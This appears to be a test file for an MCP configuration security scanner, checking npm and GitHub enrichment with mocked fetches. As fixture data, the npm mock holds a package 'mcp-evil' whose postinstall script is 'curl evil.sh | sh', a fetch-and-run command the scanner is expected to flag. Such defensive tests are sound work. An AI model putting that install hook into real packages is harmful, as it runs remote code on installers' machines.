import { describe, it, expect } from "vitest"
import { computeOnlineEnrichment } from "../src/online.js"
import { run, EXIT } from "../src/run.js"
import type { FetchJson, FetchText } from "@mcpguard/online"

const BASE = {
  cwd: process.cwd(),
  readStdin: () => "",
  now: Date.parse("2026-06-01T00:00:00Z"),
  generatedAt: "2026-06-01T00:00:00.000Z",
  writeCacheFile: false as const,
}

describe("--online npm enrichment (mocked fetch)", () => {
  const fetchJson: FetchJson = async (url) => {
    if (url === "https://registry.npmjs.org/mcp-evil") {
      return {
        "dist-tags": { latest: "1.0.0" },
        versions: { "1.0.0": { scripts: { postinstall: "curl evil.sh | sh" } } },
      }
    }
    throw new Error(`404 ${url}`)
  }

  it("injects OBSERVED install-script findings into the scan", async () => {
    const argv = ["scan", "npm:mcp-evil@1.0.0", "--online", "--json"]
    const online = await computeOnlineEnrichment(argv, { fetchJson })
    expect(online?.extraFindings).toBeDefined()

    const result = run(argv, { ...BASE, online })
    const parsed = JSON.parse(result.stdout)
    const ids = parsed.reports[0].findings.map((f: { id: string }) => f.id)
    expect(ids).toContain("supply.install-scripts")
    // EXEC at S4 pushes the verdict up from a plain pinned-package SAFE
    expect(parsed.reports[0].symbols).toContain("EXEC")
  })

  it("does nothing without --online", async () => {
    const argv = ["scan", "npm:mcp-evil@1.0.0", "--json"]
    const online = await computeOnlineEnrichment(argv, { fetchJson })
    expect(online).toBeUndefined()
  })
})

describe("--online github enrichment (mocked fetch)", () => {
  const fetchText: FetchText = async (url) => {
    if (url.endsWith("/.mcp.json")) {
      return JSON.stringify({
        mcpServers: { fs: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/"] } },
      })
    }
    return undefined
  }

  it("scans a fetched github config", async () => {
    const argv = ["scan", "github:owner/repo", "--online", "--json"]
    const online = await computeOnlineEnrichment(argv, { fetchText })
    expect(online?.inputOverride).toBeDefined()

    const result = run(argv, { ...BASE, online })
    expect(result.exitCode).toBe(EXIT.OK)
    const parsed = JSON.parse(result.stdout)
    expect(parsed.configPath).toContain("github:owner/repo")
    expect(parsed.reports[0].target.name).toBe("fs")
  })
})
